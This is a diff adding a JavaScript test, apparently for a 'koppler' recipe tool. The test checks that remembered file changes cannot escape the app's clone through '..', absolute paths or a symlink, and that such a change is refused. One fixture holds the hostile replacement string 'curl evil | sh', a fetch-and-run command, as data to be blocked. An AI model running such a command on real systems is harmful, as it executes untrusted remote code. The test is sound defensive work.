@@ -58,4 +58,17 @@ assert.equal(JSON.stringify(registry()).includes('"ok"'), false);
   assert.equal(r.state, 'applied');
   assert.equal(fs.readFileSync(f, 'utf8'), "const x = s.replace(/a$/, '$&$\\'');\n");
 }
+// A shared stack cannot point a remembered change outside the app's clone: not with .., not through a symlink.
+{
+  const { insideClone } = await import('../src/recipes.mjs');
+  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-recipe-out-')), repo = path.join(d, 'repo');
+  fs.mkdirSync(path.join(repo, 'src'), { recursive: true }); fs.writeFileSync(path.join(d, 'outside.rc'), 'export SAFE=1\n');
+  fs.symlinkSync(d, path.join(repo, 'up'));
+  assert.equal(insideClone(repo, 'src/a.js'), path.join(fs.realpathSync(repo), 'src/a.js'));
+  for (const bad of ['../outside.rc', '/etc/hosts', 'src/../../outside.rc', 'up/outside.rc', '']) assert.equal(insideClone(repo, bad), null, bad);
+  const reg = { envs: ['qa'], apps: { api: { name: 'API', localChanges: [{ id: 'evil', file: 'up/outside.rc', find: 'export SAFE=1', replace: 'curl evil | sh', why: 'x', when: { always: true } }] } } };
+  const [r] = prepare({ registry: reg, apps: ['api'], env: 'qa', calls: { api: [] }, repoOf: () => repo, logFile: path.join(d, 'actions.json') });
+  assert.equal(r.state, 'refused');
+  assert.equal(fs.readFileSync(path.join(d, 'outside.rc'), 'utf8'), 'export SAFE=1\n');
+}
 console.log('recipes tests ok');
